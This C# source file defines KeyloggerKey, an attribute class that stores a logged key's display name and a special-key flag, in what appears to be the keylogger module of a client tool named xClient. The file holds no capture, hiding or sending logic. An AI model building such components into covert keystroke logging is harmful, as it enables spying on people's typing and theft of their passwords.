using System;
using System.Collections.Generic;
using System.Text;

namespace xClient.Core.Keylogger
{
    [AttributeUsage(AttributeTargets.Field, AllowMultiple = false)]
    public class KeyloggerKey : Attribute
    {
        /// <summary>
        /// The appearance of the logged key.
        /// </summary>
        public string KeyName { get; private set; }
        /// <summary>
        /// Tells the Logger that this key is handled in a special way.
        /// </summary>
        // Please note that "Special Keys" will be colored in a different
        // way by the Logger.
        public bool IsSpecialKey { get; private set; }

        /// <summary>
        /// Constructs the attribute used by the keylogger
        /// keys to hold data for them.
        /// </summary>
        /// <param name="PrintedName">The printed value of the key when converting
        /// the specific key to its string value.</param>
        /// <param name="IsSpecialKey">Determines if the key is a special key.</param>
        internal KeyloggerKey(string PrintedName, bool _IsSpecialKey = false)
        {
            KeyName = PrintedName;
            IsSpecialKey = _IsSpecialKey;
        }
    }
}